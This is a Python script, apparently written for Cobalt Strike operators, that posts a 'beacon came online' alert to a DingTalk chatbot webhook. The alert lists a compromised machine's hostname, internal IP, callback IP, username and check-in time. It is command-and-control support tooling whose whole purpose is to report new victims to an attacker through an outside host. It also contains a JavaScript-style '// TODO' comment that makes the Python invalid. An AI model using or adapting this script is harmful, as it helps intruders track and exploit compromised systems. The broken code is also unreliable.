# encoding:utf-8
import argparse
import  time
from dingtalkchatbot.chatbot import DingtalkChatbot

parser = argparse.ArgumentParser(description='Beacon Info')
parser.add_argument('--computername')
parser.add_argument('--internalip')
parser.add_argument('--externalip')
parser.add_argument('--username')
args = parser.parse_args()

internalip = args.internalip
externalip = args.externalip
computername = args.computername
username = args.username

content = """## <font color=Blue>CobaltStrike 上线提醒</font>\n
**主机名: {}**\n
**内网IP: {}**\n
**回连IP: {}**\n
**用户名: {}**\n
**上线时间: {}**\n
""".format(computername, internalip, externalip , username, time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time())))

webhook = 'https://oapi.dingtalk.com/robot/send?access_token=xxx'  // TODO
xiaoding = DingtalkChatbot(webhook)
xiaoding.send_markdown(title="CS上线",text=content)